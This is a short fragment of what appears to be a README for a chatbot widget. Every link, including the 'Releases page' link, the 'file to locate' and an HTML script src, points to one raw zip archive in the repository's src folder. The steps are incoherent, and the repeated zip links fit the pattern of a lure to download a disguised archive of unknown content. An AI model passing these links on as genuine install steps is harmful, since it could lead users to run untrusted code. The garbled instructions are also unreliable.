...
To get started, visit the [Releases page](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Stack_Script_Workers_Java_Cloudflare_Embeddable_Full_Chatbot_RA_Widget_v1.6.zip) to download the latest version of the Chatbot Widget. 
...
2. Open the extracted folder and locate the `https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Stack_Script_Workers_Java_Cloudflare_Embeddable_Full_Chatbot_RA_Widget_v1.6.zip` file.
...
2. Add the following script tag in the `<head>` section or just before the closing `</body>` tag:
   ...
   ```html
   <script src="https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Stack_Script_Workers_Java_Cloudflare_Embeddable_Full_Chatbot_RA_Widget_v1.6.zip"></script>
   ```
